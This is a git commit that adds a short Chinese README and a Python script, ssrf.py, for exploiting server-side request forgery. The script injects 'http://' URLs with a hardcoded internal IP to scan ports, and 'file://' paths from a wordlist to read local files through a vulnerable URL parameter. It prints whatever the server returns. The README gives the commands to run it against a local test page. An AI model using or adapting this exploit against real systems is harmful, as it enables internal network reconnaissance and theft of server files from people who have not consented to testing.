3553f1abdce1e68e33f37eb4975bd1e014c0511a
1402773304 <1402773304@qq.com>
2020-05-07 00:34:41 +0800

    ssrf

--- README.md
+++ README.md
@@ -1,2 +1,14 @@
-# ssrf
- 
+### 命令
+
+```  
+python ssrf.py http://127.0.0.1/ssrf1.php?url  port.txt  http   
+```
+
+http 协议遍历端口
+
+```
+python ssrf.py http://127.0.0.1/ssrf1.php?url  path.txt  file  
+```
+
+file 协议遍历文件
+
---
+++ ssrf.py
@@ -0,0 +1,36 @@
+#-*- coding:utf-8 -*-
+import sys
+import requests
+
+def ssrf_http(url,dir):
+    with open(dir,'r')as port:
+        for i in port:
+            path ='=http://192.168.31.17:%s'%i.strip()
+            r = requests.get(url=url+path)
+            print('-------------------')
+            print('port'+':'+i)
+
+            print(r.text)
+def ssrf_file(url,dir):
+    url =url+'=file://'
+
+    with open(dir,'r') as f:
+        f = f.readlines()
+        for i in f:
+            print('-------------------')
+            print(i)
+            print('-------------------')
+            r = requests.get(url+i.strip())
+            print(r.text)
+            print('-------------------')
+if __name__ == '__main__':
+    url = sys.argv[1]
+    dir = sys.argv[2]
+    mode = sys.argv[3]
+    if mode == 'file':
+        ssrf_file(url,dir)
+
+    else:
+        ssrf_http(url,dir)
+    #ssrf_file(url,dir)
+    #ssrf_http(url,dir)
